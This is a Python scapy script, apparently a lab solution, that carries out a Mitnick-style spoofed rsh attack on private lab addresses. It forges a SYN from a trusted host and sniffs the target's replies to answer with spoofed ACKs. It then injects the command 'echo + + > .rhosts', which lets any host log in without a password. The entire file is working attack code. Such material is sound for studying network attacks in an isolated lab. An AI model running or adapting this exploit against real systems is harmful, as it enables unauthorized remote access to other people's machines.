#!/usr/bin/env python3
from curses.panel import new_panel
from fcntl import FASYNC
from time import sleep
from scapy.all import *

# prepare packets
packet = IP()/TCP()
packet[IP].src = '10.9.0.6'
packet[IP].dst = '10.9.0.5'
packet[TCP].sport = 1023
packet[TCP].dport = 514
packet[TCP].flags = 'S'


class static_var_wrapper():
    first_connection_established = False
    second_connection_established = False

# telnet_login_mapper = r'(.*)login:'
static_var = static_var_wrapper()

def spoof_pkt(pkt):
    # ls(pkt)
    
    if static_var.first_connection_established == False and \
    pkt[TCP].sport == 514 and pkt[TCP].dport == 1023 and 'S' in pkt[TCP].flags and 'A' in pkt[TCP].flags:
        
        # step 2. reply the SYN+ACK from x-terminal
        packet[TCP].ack = pkt[TCP].seq+1
        packet[TCP].seq = pkt[TCP].ack
        packet[TCP].flags = 'A'
        del(packet.chksum)
        del(packet[TCP].chksum)
        send(packet, verbose=0)
        print('step 2 finish')
        
        # step 3. reply x-terminal again but this time send with data
        # data = '9090\x00root\x00root\x00touch /tmp/xyz\x00'
        data = '9090\x00root\x00root\x00echo + + > .rhosts\x00'
        del(packet.chksum)
        del(packet[TCP].chksum)
        send(packet/data, verbose=0)
        print('step 3 finish')
        print('first connection established')
        static_var.first_connection_established = True
    
    if static_var.first_connection_established == True and \
    static_var.second_connection_established == False and \
    pkt[TCP].sport == 1023 and pkt[TCP].dport == 9090 and 'S' in pkt[TCP].flags:
        
        # step 2. reply the SYN+ACK from x-terminal
        packet[TCP].ack = pkt[TCP].seq+1
        packet[TCP].seq = 777
        packet[TCP].flags = 'SA'
        packet[TCP].sport = 9090
        packet[TCP].dport = 1023
        del(packet.chksum)
        del(packet[TCP].chksum)
        send(packet, verbose=0)
        print('step 4 finish')
        print('second connection established')
        
        static_var.second_connection_established = True
    
    if static_var.second_connection_established == True and \
    pkt[TCP].sport == 514 and pkt[TCP].dport == 1023:
        
        # step 5. reply the SYN+ACK from x-terminal
        packet[TCP].ack = pkt[TCP].seq+1
        packet[TCP].seq = pkt[TCP].ack
        packet[TCP].sport = 1023
        packet[TCP].dport = 514
        packet[TCP].flags = 'A'
        del(packet.chksum)
        del(packet[TCP].chksum)
        send(packet, verbose=0)
        print('step 5 finish')
        
        exit(0)
        
        


if __name__ == '__main__':
    
    # step 1. spoof the SYN packet to x-terminal to initiate the connection
    del(packet.chksum)
    del(packet[TCP].chksum)
    send(packet, verbose=0)
    print('step 1 finish')
    
    pkt = sniff(iface='br-8bdd88cc20ec', filter='tcp and ip src 10.9.0.5 and not ether src 02:42:bb:0f:b4:88', prn=spoof_pkt)
